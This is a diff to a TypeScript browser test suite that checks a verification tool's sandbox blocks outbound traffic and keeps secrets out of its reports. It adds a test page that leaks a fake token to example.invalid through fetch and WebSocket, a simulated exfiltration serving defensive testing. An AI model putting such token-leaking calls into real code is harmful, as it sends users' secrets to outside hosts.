@@ -60,7 +60,23 @@ function setupFakeProjectForBrowser(tempRoot: string): {
   fs.writeFileSync(path.join(root, 'package.json'), pkgJsonContent, 'utf8');
   const pkgHash = sha256Hex(pkgJsonContent);
 
-  const lockContent = "lockfileVersion: '9.0'\n";
+  const lockContent = [
+    "lockfileVersion: '9.0'",
+    'importers:',
+    '  .:',
+    '    dependencies:',
+    ...plan.exactDependencies.flatMap(dep => [
+      '      ' + JSON.stringify(dep.name) + ':',
+      '        specifier: ' + dep.version,
+      '        version: ' + dep.version,
+    ]),
+    'packages:',
+    ...plan.exactDependencies.flatMap(dep => [
+      '  ' + JSON.stringify(dep.name + '@' + dep.version) + ':',
+      '    resolution: {integrity: sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==}',
+    ]),
+    '',
+  ].join('\n');
   fs.writeFileSync(path.join(root, 'pnpm-lock.yaml'), lockContent, 'utf8');
   const lockHash = sha256Hex(lockContent);
 
@@ -104,7 +120,7 @@ function setupFakeProjectForBrowser(tempRoot: string): {
   return { root, canonicalRoot, artifactRoot, plan, applyResult };
 }
 
-async function startHostServer(mode: 'ok' | 'click-broken' | 'zero-size' | 'pageerror' | 'outbound' | 'popup' | 'alt-visual'): Promise<{ url: string; close: () => Promise<void> }> {
+async function startHostServer(mode: 'ok' | 'click-broken' | 'zero-size' | 'pageerror' | 'outbound' | 'outbound-sensitive' | 'popup' | 'alt-visual'): Promise<{ url: string; close: () => Promise<void> }> {
   const server = http.createServer((req, res) => {
     const reqPath = new URL(req.url ?? '/', 'http://127.0.0.1').pathname;
     if (reqPath === '/generated-module.js') {
@@ -143,6 +159,11 @@ async function startHostServer(mode: 'ok' | 'click-broken' | 'zero-size' | 'page
     if (mode === 'outbound') {
       fetch('https://example.com/leak').catch(() => {});
     }
+    if (mode === 'outbound-sensitive') {
+      fetch('https://example.invalid/leak?token=URL_SECRET_7429').catch(() => {});
+      try { new WebSocket('ws://example.invalid/private?token=URL_SECRET_7429'); } catch { /* expected by the verification boundary */ }
+      new WebSocket('ws://' + location.host + '/same-origin');
+    }
     if (mode === 'popup') {
       window.open('http://127.0.0.1/popup', '_blank');
     }
@@ -172,6 +193,7 @@ async function startHostServer(mode: 'ok' | 'click-broken' | 'zero-size' | 'page
 }
 
 test('verifyIntegration 真实 Chromium 交互、安全隔离与视觉三态验收', async () => {
+  test.setTimeout(120_000);
   const cliExports = await loadT17CliExports();
   const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'zhinexus-t17-browser-'));
 
@@ -317,6 +339,25 @@ test('verifyIntegration 真实 Chromium 交互、安全隔离与视觉三态验�
       } finally {
         await badHost.close();
       }
+    }
+
+    const sensitiveHost = await startHostServer('outbound-sensitive');
+    try {
+      const { spec, authorization } = makeBrowserSpecAndAuth(sensitiveHost.url);
+      const report = await callVerify(cliExports, root, plan, { applyResult, spec, authorization, artifactRoot });
+      expect(report?.status).toBe('failed');
+      expect(report?.checks.find(c => c.id === 'dependency-guard')?.status).toBe('passed');
+      expect(report?.checks.find(c => c.id === 'browser')?.status).toBe('failed');
+      const behaviorRef = report!.artifacts.find(a => a.path.endsWith('behavior.json'))!;
+      const behavior = fs.readFileSync(path.join(artifactRoot, behaviorRef.path), 'utf8');
+      expect(behavior).toContain('outbound_blocked');
+      expect(behavior).toContain('websocket_blocked');
+      expect(behavior.match(/websocket_blocked/g)?.length).toBe(1);
+      expect(behavior).not.toContain('URL_SECRET_7429');
+      expect(behavior).not.toContain('example.invalid');
+      expect(JSON.stringify(report)).not.toContain('URL_SECRET_7429');
+    } finally {
+      await sensitiveHost.close();
     }
   } finally {
     fs.rmSync(tempRoot, { recursive: true, force: true });
